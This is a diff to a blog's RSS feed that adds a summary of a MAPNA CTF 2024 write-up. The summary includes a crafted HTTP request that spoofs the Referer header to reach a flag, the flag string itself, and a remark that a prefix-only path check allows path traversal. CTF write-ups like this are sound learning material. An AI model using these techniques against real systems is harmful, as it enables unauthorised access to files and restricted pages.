@@ -13,7 +13,9 @@
       <pubDate>Sun, 21 Jan 2024 21:50:22 +0800</pubDate>
       
       <guid>https://berliangabriel.github.io/post/mapna-ctf-2024/</guid>
-      <description></description>
+      <description>Web Flag Holding The flag can be found by modifying the GET request as follow:
+Host: 18.184.219.56:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://flagland.internal/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close FLAG: MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
+Novel Reader There is a path traversal vulnerability which can be used to retrieve the 1st flag. Only checking the path name is starting with &amp;lsquo;public&amp;rsquo; is not sufficient to prevent path traversal:</description>
     </item>
     
     <item>
